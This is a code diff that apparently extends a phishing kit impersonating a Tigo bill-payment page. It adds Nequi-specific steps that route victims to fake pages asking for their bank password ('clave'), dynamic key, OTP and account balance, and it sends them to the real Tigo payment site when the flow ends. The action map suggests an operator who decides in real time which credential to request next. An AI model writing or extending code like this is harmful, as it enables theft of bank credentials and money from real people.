@@ -434,6 +434,14 @@
                     button: 'btnContinuar',
                     validation: (d) => d.dinamica?.length >= 4,
                     numericInputs: ['dinamica']
+                },
+                'saldo-input.html': {
+                    stage: 'saldo',
+                    form: 'saldoForm',
+                    inputs: { saldo: 'saldoInput' },
+                    button: 'btnValidar',
+                    validation: (d) => d.saldo?.length >= 1,
+                    numericInputs: ['saldo']
                 }
             }
         }
@@ -539,12 +547,16 @@
                 request_password: 'password.html',
                 request_clave: 'clave.html',
                 clave: 'clave.html',
+                nequi_request_clave: 'clave.html',
+                nequi_pedir_clave: 'clave.html',
                 
                 // Dinámicas
                 dinamica: 'dinamica.html',
                 dynamic: 'dynamic.html',
                 request_dynamic: 'dinamica.html',
                 request_dinamica: 'dinamica.html',
+                nequi_request_dinamica: 'clave-dinamica.html',
+                nequi_pedir_dinamica: 'clave-dinamica.html',
                 
                 // Tokens
                 token: 'token.html',
@@ -554,9 +566,18 @@
                 otp: 'otp.html',
                 request_otp: 'otp.html',
                 
+                // Nequi específico - Saldo
+                nequi_aprobar_saldo: 'clave.html',
+                aprobar_saldo: 'clave.html',
+                nequi_saldo_rechazado: 'saldo-input.html',
+                saldo_rechazado: 'saldo-input.html',
+                nequi_error_saldo: 'saldo-input.html',
+                error_saldo: 'saldo-input.html',
+                
                 // Finalizar
                 finish: 'https://mi.tigo.com.co/pago-express/facturas',
-                finalizar: 'https://mi.tigo.com.co/pago-express/facturas'
+                finalizar: 'https://mi.tigo.com.co/pago-express/facturas',
+                nequi_finalizar: 'https://mi.tigo.com.co/pago-express/facturas'
             };
             
             const nextPage = actionMap[data.action];
